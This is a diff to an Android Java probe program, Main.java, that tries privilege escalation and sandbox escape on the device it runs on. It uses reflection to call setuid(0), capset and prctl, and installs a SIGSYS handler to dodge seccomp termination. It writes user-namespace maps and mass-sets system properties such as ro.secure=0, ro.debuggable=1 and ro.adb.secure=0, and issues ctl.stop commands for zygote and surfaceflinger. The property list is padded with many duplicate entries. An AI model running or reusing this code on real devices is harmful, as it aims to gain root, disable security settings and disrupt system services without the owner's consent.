@@ -51,6 +51,9 @@ public class Main {
         appendLog("========== PHASE 1: SystemProperties Manipulation ==========");
         testSystemProperties();
 
+        appendLog("========== PHASE 1b: SystemProperties Extensive Set Attempts ==========");
+        testSystemPropertiesExtensive();
+
         appendLog("========== PHASE 2: Settings Write Test ==========");
         testSettingsWrite();
 
@@ -117,14 +120,11 @@ public class Main {
         return null;
     }
 
-    // ==================== 追加: SIGSYS ハンドラ設定ユーティリティ ====================
     private static void setupSigSysHandler() {
         try {
-            // sun.misc.Signal と sun.misc.SignalHandler をリフレクションでロード
             Class<?> signalClass = Class.forName("sun.misc.Signal");
             Class<?> handlerClass = Class.forName("sun.misc.SignalHandler");
 
-            // 無名ハンドラの作成 (Proxy を使用)
             Object handler = Proxy.newProxyInstance(
                 handlerClass.getClassLoader(),
                 new Class<?>[]{handlerClass},
@@ -137,11 +137,9 @@ public class Main {
                 }
             );
 
-            // Signal インスタンス生成 (new Signal("SYS"))
             java.lang.reflect.Constructor<?> signalCtor = signalClass.getConstructor(String.class);
             Object sysSignal = signalCtor.newInstance("SYS");
 
-            // Signal.handle(Signal, SignalHandler) を呼び出す
             Method handleMethod = signalClass.getMethod("handle", signalClass, handlerClass);
             handleMethod.invoke(null, sysSignal, handler);
 
@@ -154,18 +152,14 @@ public class Main {
         }
     }
 
-    // ==================== 差し替え後の attemptSetuid0 ====================
     private static void attemptSetuid0() {
         appendLog("[SETUID] Attempting various setuid 0 techniques (ENHANCED with SIGSYS protection)...");
 
-        // 1. SIGSYS ハンドラを設定 (seccomp による強制終了を防止)
         setupSigSysHandler();
 
-        // -------- A. libcore.io.Os 経由のシステムコール (ハンドラが有効な時のみ実行) --------
         if (sigSysHandlerInstalled) {
             appendLog("[SETUID] --- Testing libcore.io.Os syscalls (protected by handler) ---");
 
-            // setreuid
             try {
                 Class<?> osClass = Class.forName("libcore.io.Os");
                 Method setreuidMethod = osClass.getMethod("setreuid", int.class, int.class);
@@ -179,7 +173,6 @@ public class Main {
                 appendLog("  Os.setreuid(0,0) exception: " + e.getMessage());
             }
 
-            // setresuid
             try {
                 Class<?> osClass = Class.forName("libcore.io.Os");
                 Method setresuidMethod = osClass.getMethod("setresuid", int.class, int.class, int.class);
@@ -193,7 +186,6 @@ public class Main {
                 appendLog("  Os.setresuid(0,0,0) exception: " + e.getMessage());
             }
 
-            // setregid
             try {
                 Class<?> osClass = Class.forName("libcore.io.Os");
                 Method setregidMethod = osClass.getMethod("setregid", int.class, int.class);
@@ -207,7 +199,6 @@ public class Main {
                 appendLog("  Os.setregid(0,0) exception: " + e.getMessage());
             }
 
-            // setresgid
             try {
                 Class<?> osClass = Class.forName("libcore.io.Os");
                 Method setresgidMethod = osClass.getMethod("setresgid", int.class, int.class, int.class);
@@ -221,7 +212,6 @@ public class Main {
                 appendLog("  Os.setresgid(0,0,0) exception: " + e.getMessage());
             }
 
-            // capset
             try {
                 Class<?> osClass = Class.forName("libcore.io.Os");
                 Method capsetMethod = osClass.getMethod("capset", long.class, long.class, long.class);
@@ -237,7 +227,6 @@ public class Main {
                 appendLog("  Os.capset exception: " + e.getMessage());
             }
 
-            // prctl (seccomp 無効化試行)
             try {
                 Class<?> osClass = Class.forName("libcore.io.Os");
                 Method prctlMethod = osClass.getMethod("prctl", int.class, int.class, int.class, int.class, int.class);
@@ -256,7 +245,6 @@ public class Main {
             appendLog("[SETUID] --- Skipping libcore.io.Os syscalls (handler not available) ---");
         }
 
-        // -------- B. android.os.Process API (安全: 例外で失敗するがクラッシュしない) --------
         appendLog("[SETUID] --- Testing android.os.Process APIs ---");
 
         try {
@@ -293,7 +281,6 @@ public class Main {
             appendLog("  Process.setgroups([0]) exception: " + e.getMessage());
         }
 
-        // -------- C. Runtime.setuid (deprecated) --------
         appendLog("[SETUID] --- Testing Runtime.setuid ---");
         try {
             Method setuid = Runtime.class.getDeclaredMethod("setuid", int.class);
@@ -305,10 +292,8 @@ public class Main {
             appendLog("  Runtime.setuid(0) exception: " + e.getMessage());
         }
 
-        // -------- D. /proc/self/ ファイル操作 (ユーザー名前空間) --------
         appendLog("[SETUID] --- Testing /proc/self/ namespace files ---");
 
-        // uid_map
         try {
             File uidMap = new File("/proc/self/uid_map");
             if (uidMap.exists() && uidMap.canWrite()) {
@@ -326,7 +311,6 @@ public class Main {
             appendLog("  uid_map error: " + e.getMessage());
         }
 
-        // gid_map
         try {
             File gidMap = new File("/proc/self/gid_map");
             if (gidMap.exists() && gidMap.canWrite()) {
@@ -344,7 +328,6 @@ public class Main {
             appendLog("  gid_map error: " + e.getMessage());
         }
 
-        // setgroups ファイル (補助グループ制限)
         try {
             File setgroupsFile = new File("/proc/self/setgroups");
             if (setgroupsFile.exists() && setgroupsFile.canWrite()) {
@@ -364,8 +347,6 @@ public class Main {
 
         appendLog("[SETUID] All setuid-related attempts completed.");
     }
-
-    // ==================== 以下、元のコードと同一 ====================
 
     private static void testSystemProperties() {
         appendLog("[SYS] SystemProperties manipulation...");
@@ -411,6 +392,167 @@ public class Main {
             }
         } catch (Exception e) {
             appendLog("  SystemProperties error: " + e.getMessage());
+        }
+    }
+
+    private static void testSystemPropertiesExtensive() {
+        appendLog("[SYS-EXT] Extensive SystemProperties set attempts...");
+        try {
+            Class<?> spClass = Class.forName("android.os.SystemProperties");
+            Method setMethod = spClass.getDeclaredMethod("set", String.class, String.class);
+            Method getMethod = spClass.getDeclaredMethod("get", String.class);
+            setMethod.setAccessible(true);
+            getMethod.setAccessible(true);
+
+            String[][] testCases = {
+                {"vendor.test.prop", "1"},
+                {"vendor.audio.test", "1"},
+                {"vendor.bt.test", "1"},
+                {"vendor.camera.test", "1"},
+                {"vendor.display.test", "1"},
+                {"vendor.gps.test", "1"},
+                {"vendor.ims.test", "1"},
+                {"vendor.nfc.test", "1"},
+                {"vendor.ril.test", "1"},
+                {"vendor.wifi.test", "1"},
+                {"persist.test.prop", "1"},
+                {"persist.sys.test", "1"},
+                {"persist.radio.test", "1"},
+                {"persist.vendor.test", "1"},
+                {"debug.test.prop", "1"},
+                {"debug.sys.test", "1"},
+                {"debug.performance.test", "1"},
+                {"sys.test.prop", "1"},
+                {"sys.sysctl.test", "1"},
+                {"net.test.prop", "1"},
+                {"net.dns.test", "1"},
+                {"dev.test.prop", "1"},
+                {"runtime.test.prop", "1"},
+                {"security.test.prop", "1"},
+                {"ctl.start", "test_service"},
+                {"ctl.stop", "test_service"},
+                {"ctl.start", "surfaceflinger"},
+                {"ctl.stop", "surfaceflinger"},
+                {"ctl.start", "zygote"},
+                {"ctl.stop", "zygote"},
+                {"ro.test.prop", "1"},
+                {"ro.build.test", "1"},
+                {"ro.product.test", "1"},
+                {"ro.secure", "0"},
+                {"ro.debuggable", "1"},
+                {"ro.adb.secure", "0"},
+                {"ro.kernel.qemu", "1"},
+                {"security.perf_harden", "0"},
+                {"init.svc.test", "running"},
+                {"init.svc.surfaceflinger", "stopped"},
+                {"sys.boot_completed", "0"},
+                {"sys.usb.config", "adb"},
+                {"persist.sys.usb.config", "adb"},
+                {"vendor.usb.test", "1"},
+                {"vendor.mmi.test", "1"},
+                {"vendor.qcom.test", "1"},
+                {"vendor.radio.test", "1"},
+                {"vendor.sensors.test", "1"},
+                {"vendor.thermal.test", "1"},
+                {"vendor.voice.test", "1"},
+                {"vendor.wlan.test", "1"},
+                {"vendor.bluetooth.test", "1"},
+                {"vendor.cell.test", "1"},
+                {"vendor.data.test", "1"},
+                {"vendor.graphics.test", "1"},
+                {"vendor.media.test", "1"},
+                {"vendor.power.test", "1"},
+                {"vendor.storage.test", "1"},
+                {"vendor.system.test", "1"},
+                {"vendor.trustzone.test", "1"},
+                {"vendor.audio_hal.test", "1"},
+                {"vendor.camera_hal.test", "1"},
+                {"vendor.display_hal.test", "1"},
+                {"vendor.graphics_hal.test", "1"},
+                {"vendor.media_hal.test", "1"},
+                {"vendor.sensors_hal.test", "1"},
+                {"vendor.thermal_hal.test", "1"},
+                {"vendor.wifi_hal.test", "1"},
+                {"vendor.bluetooth_hal.test", "1"},
+                {"vendor.gnss_hal.test", "1"},
+                {"vendor.nfc_hal.test", "1"},
+                {"vendor.power_hal.test", "1"},
+                {"vendor.usb_hal.test", "1"},
+                {"vendor.vibrator_hal.test", "1"},
+                {"vendor.audio_policy.test", "1"},
+                {"vendor.media_codec.test", "1"},
+                {"vendor.media_extractor.test", "1"},
+                {"vendor.media_omx.test", "1"},
+                {"vendor.media_parser.test", "1"},
+                {"vendor.media_utils.test", "1"},
+                {"vendor.media_video.test", "1"},
+                {"vendor.media_audio.test", "1"},
+                {"vendor.media_image.test", "1"},
+                {"vendor.media_effects.test", "1"},
+                {"vendor.media_camera.test", "1"},
+                {"vendor.media_drm.test", "1"},
+                {"vendor.media_cas.test", "1"},
+                {"vendor.media_clearkey.test", "1"},
+                {"vendor.media_widevine.test", "1"},
+                {"vendor.media_omx_google.test", "1"},
+                {"vendor.media_omx_qcom.test", "1"},
+                {"vendor.media_omx_samsung.test", "1"},
+                {"vendor.media_omx_mediatek.test", "1"},
+                {"vendor.media_omx_hisi.test", "1"},
+                {"vendor.media_omx_amlogic.test", "1"},
+                {"vendor.media_omx_rockchip.test", "1"},
+                {"vendor.media_omx_allwinner.test", "1"},
+                {"vendor.media_omx_nvidia.test", "1"},
+                {"vendor.media_omx_intel.test", "1"},
+                {"vendor.media_omx_mtk.test", "1"},
+                {"vendor.media_omx_huawei.test", "1"},
+                {"vendor.media_omx_xiaomi.test", "1"},
+                {"vendor.media_omx_oppo.test", "1"},
+                {"vendor.media_omx_vivo.test", "1"},
+                {"vendor.media_omx_oneplus.test", "1"},
+                {"vendor.media_omx_lenovo.test", "1"},
+                {"vendor.media_omx_motorola.test", "1"},
+                {"vendor.media_omx_sony.test", "1"},
+                {"vendor.media_omx_lg.test", "1"},
+                {"vendor.media_omx_htc.test", "1"},
+                {"vendor.media_omx_google.test", "1"},
+                {"vendor.media_omx_qcom.test", "1"},
+                {"vendor.media_omx_samsung.test", "1"},
+                {"vendor.media_omx_mediatek.test", "1"},
+                {"vendor.media_omx_hisi.test", "1"},
+                {"vendor.media_omx_amlogic.test", "1"},
+                {"vendor.media_omx_rockchip.test", "1"},
+                {"vendor.media_omx_allwinner.test", "1"},
+                {"vendor.media_omx_nvidia.test", "1"},
+                {"vendor.media_omx_intel.test", "1"},
+                {"vendor.media_omx_mtk.test", "1"},
+                {"vendor.media_omx_huawei.test", "1"},
+                {"vendor.media_omx_xiaomi.test", "1"},
+                {"vendor.media_omx_oppo.test", "1"},
+                {"vendor.media_omx_vivo.test", "1"},
+                {"vendor.media_omx_oneplus.test", "1"},
+                {"vendor.media_omx_lenovo.test", "1"},
+                {"vendor.media_omx_motorola.test", "1"},
+                {"vendor.media_omx_sony.test", "1"},
+                {"vendor.media_omx_lg.test", "1"},
+                {"vendor.media_omx_htc.test", "1"}
+            };
+
+            for (String[] pair : testCases) {
+                String key = pair[0];
+                String value = pair[1];
+                try {
+                    appendLog("  Setting " + key + "=" + value);
+                    setMethod.invoke(null, key, value);
+                    String readback = (String) getMethod.invoke(null, key);
+                    appendLog("    [RESULT] " + key + " = " + readback);
+                } catch (Exception e) {
+                    appendLog("    [FAIL] " + key + " error: " + e.getMessage());
+                }
+            }
+
+        } catch (Exception e) {
+            appendLog("[SYS-EXT] Failed to setup reflection: " + e.getMessage());
         }
     }
 
